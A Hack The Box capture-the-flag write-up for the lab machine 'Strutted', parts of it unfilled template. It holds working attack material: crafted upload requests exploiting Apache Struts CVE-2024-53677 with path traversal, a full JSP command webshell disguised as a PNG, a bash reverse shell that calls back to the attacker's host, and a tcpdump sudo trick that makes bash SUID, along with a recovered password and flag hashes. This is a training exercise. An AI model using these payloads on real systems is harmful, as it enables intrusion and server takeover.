### Hack The Box Writeup: \[Strutted\]

## Overview

- **Machine Name**: Strutted
- **Difficulty**: Medium
- **Platform**: Hack The Box
- **Operating System**: LInux
- **Key Objectives**: \[Briefly describe what you aimed to achieve, e.g., Gain root/admin access, exploit a specific vulnerability\]
- **Date Solved**: \[e.g., May 2025\]

This writeup details my approach to solving the \[Machine Name\] machine on Hack The Box, including enumeration, exploitation, and privilege escalation. The focus was on \[key techniques, e.g., exploiting outdated software, privilege escalation via misconfigurations\].

## Tools Used

- **Enumeration**: \[e.g., Nmap, Gobuster\]
- **Exploitation**: \[e.g., Metasploit, Custom Python scripts\]
- **Privilege Escalation**: \[e.g., LinPEAS, Windows Exploit Suggester\]
- **Other**: \[e.g., Burp Suite, Wireshark\]

## Methodology

### Initial Enumeration

\[Describe the initial steps to gather information about the target machine. Include commands and outputs.\]

```bash
# Do a ping to knwo if machine is active or it doesnt

ping -c 1 10.10.11.59

# Port scannong with nmap
nmap -p- --open --min-rate 5000 -sS -vvv -v -Pn 10.10.11.59 -oG allPorts

nmap -sCV -p22,80 10.10.11.59 -oN targeted

# Prevously, we need to add strutted.htb into /etc/hosts

whatweb http://strutted.htb

```

\[Explain findings, e.g., open ports, services, versions.\]

### Contents
Theres a stutted.zip files that contains all webpage files


### Vulnerabilities
- Apache Struts (CVE-2024-53677):
  1. Path traversal
  2. Remote Code Execution
- Tomcat Users

### Understanding
- First, we need to open Burpsuite and downlaod any png file. Upload it in the web page and intercept with Burpsuite

- After that, the following request was made:
```bash
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://strutted.htb/upload.action
Content-Type: multipart/form-data; boundary=---------------------------388871286435985454764127734883
Content-Length: 24571
Origin: http://strutted.htb
DNT: 1
Connection: keep-alive
Cookie: JSESSIONID=DC3558DE24F1713AAC6D981931A9960C
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------388871286435985454764127734883
Content-Disposition: form-data; name="upload"; filename="cat.png"
Content-Type: image/png
```

- Searching a CVE-2024-53677 exploit:

```py
# extract
        files = {
            'Upload': ("exploit_file.jsp", self.file_content, 'text/plain'),
            'top.UploadFileName': (None, self.path),
        }

        try:
            response = requests.post(self.url, files=files)
            print("Status Code:", response.status_code)
            print("Response Text:", response.text)
            if response.status_code == 200:
                print("File uploaded successfully.")
            else:
                print("Failed to upload file.")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")


```

- In the apache strutts documentation, there's a configuration named `Upload File` that uses `OGNL` to validate request content an evaluates all file uploads


### Exploitation
- In the original request, we need to modify name attribute to `Upload`. Firt letter must be in Upper case

- After doing this, we nned to add the following part into the request. This one contains Strutt configuration properties to evaluates and changes file name:
```bash

Content-Disposition: form-data; name="top.UploadFileName"

../test.txt
```
- In the file name, we can add path traversal. It's important to keep all spaces in the request in the same configuration

```bash
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://strutted.htb/upload.action
Content-Type: multipart/form-data; boundary=---------------------------388871286435985454764127734883
Content-Length: 474
Origin: http://strutted.htb
DNT: 1
Connection: keep-alive
Cookie: JSESSIONID=DC3558DE24F1713AAC6D981931A9960C
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------388871286435985454764127734883
Content-Disposition: form-data; name="Upload"; filename="cat.png"
Content-Type: image/png

PNG

IHDRhM;BPLTEg^«zWQ¼ÿÿÿtn¶ïîîme`YwpNIÅ¡c@>Ñ«¤9!Ûµ®O30°wv\`ÝÓÑ¬âÖ"IEND®B`
-----------------------------388871286435985454764127734883
Content-Disposition: form-data; name="top.UploadFileName"

test.txt

-----------------------------388871286435985454764127734883--
```
- After that, we can send a jsp file with cmd jsp webshell
```txt
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://strutted.htb/
Content-Type: multipart/form-data; boundary=---------------------------385736630213016304902959025936
Content-Length: 1331
Origin: http://strutted.htb
DNT: 1
Connection: keep-alive
Cookie: JSESSIONID=F79296BCE69FF08B906E976652201F03
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------385736630213016304902959025936
Content-Disposition: form-data; name="Upload"; filename="cat.png"
Content-Type: image/png

PNG

   
IHDR  h  h   M;ç   BPLTEg^«zWQ¼ÿÿÿtn¶ïîîme`YwpNIÅ¡c@>Ñ«¤9!Ûµ®O30°wv\`ÝÓÑ¬âÖ"  
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
-----------------------------385736630213016304902959025936
Content-Disposition: form-data; name="top.UploadFileName"

../../test.jsp
-----------------------------385736630213016304902959025936--


```

```html
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

http://strutted.htb/test.jsp

- Put cmd commands in the input field

- After all, we can unse nc to listen on por 443 and send onelnier in the web input field:
```bash
bash -c "bash -i >& /dev/tcp/10.10.15.66/443 0>&1"
```

```bash
nc -nlvp 443
```

- We cant send oneliner. THen we have to create a file named index.html that contains part of the oneliner. Create a python server to make a crul on the html input field

```html
bash -i &> /dev/tcp/10.10.15.66/443 0>&1
```
```py

python3 -m http.server 80
```

- In the web field, we can make a curl and send the response to another dir
```bash
curl 10.10.15.66 -o /tmp/reverse
ls -l /tmp/reverse
bash /tmp/reverse

```

### Privilege Escalation

```bash
# Searchin files
find / -name tomcat-users.xml 2>/dev/null # save pass 
cat /etc/tomcat9/tomcat-users-.xml
# IT14d6SSP81k

# Example: Checking for SUID binaries
find / -perm -4000 2>/dev/null

# FINd capabilities
getcap -r / 2>/dev/null

# Procesess
ps -faux

# OPen ports
ss -nltp

# Using tomcat pass to enter with ssh
james@10.10.11.59

# listing
user.txt
# 39c18734612d8c5e93ec52a748b94901

```

- IN james user:
```bash
sudo -l
#  ans
Matching Defaults entries for james on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User james may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/tcpdump


```
- We can use tcpdump to be root. Serch in:

https://gtfobins.github.io/gtfobins/tcpdump/

```bash
COMMAND='chmod u+s /bin/bash'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root

# ans
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
```
- After that, we can run bash with SUID privileges
```bash
bash -p

cd /root
cat root.txt
# b049bcd8bca5e0ad851a95fc142690b4
```

## Challenges Faced

## Lessons Learned

## References

---

*Written by edibauer, \[05 2025\]. Feedback welcome at \[github.com/edibauer\].*